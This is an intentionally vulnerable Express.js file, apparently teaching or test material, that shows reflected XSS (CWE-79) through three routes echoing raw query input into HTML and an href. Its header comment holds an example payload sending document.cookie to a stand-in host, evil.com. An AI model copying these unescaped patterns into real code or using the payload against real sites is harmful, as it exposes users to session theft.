/**
 * Reflected Cross-Site Scripting (XSS) — CWE-79
 * https://cwe.mitre.org/data/definitions/79.html
 *
 * ⚠️  DELIBERATELY VULNERABLE — Do not use in production.
 *
 * This file demonstrates reflected XSS where user-supplied input is rendered
 * directly into an HTML response without sanitization or encoding.  An
 * attacker can supply a payload such as:
 *
 *   GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
 *
 * to steal session cookies or perform actions on behalf of the victim.
 *
 * Detected by: CodeQL (javascript/reflected-xss)
 * Fixed version: ../../../secure/javascript/xss-example.js
 */

const express = require("express");

const app = express();

// BAD: User input directly rendered in HTML response without sanitization
app.get("/search", (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <head><title>Search Results</title></head>
      <body>
        <h1>Search results for: ${query}</h1>
        <p>No results found.</p>
      </body>
    </html>
  `);
});

// BAD: User input reflected in an error page
app.get("/profile", (req, res) => {
  const username = req.query.user;
  res.send(`
    <html>
      <body>
        <h1>Profile</h1>
        <p>Welcome, ${username}!</p>
      </body>
    </html>
  `);
});

// BAD: User input inserted into an HTML attribute without encoding
app.get("/redirect", (req, res) => {
  const url = req.query.url;
  res.send(`
    <html>
      <body>
        <a href="${url}">Click here to continue</a>
      </body>
    </html>
  `);
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});
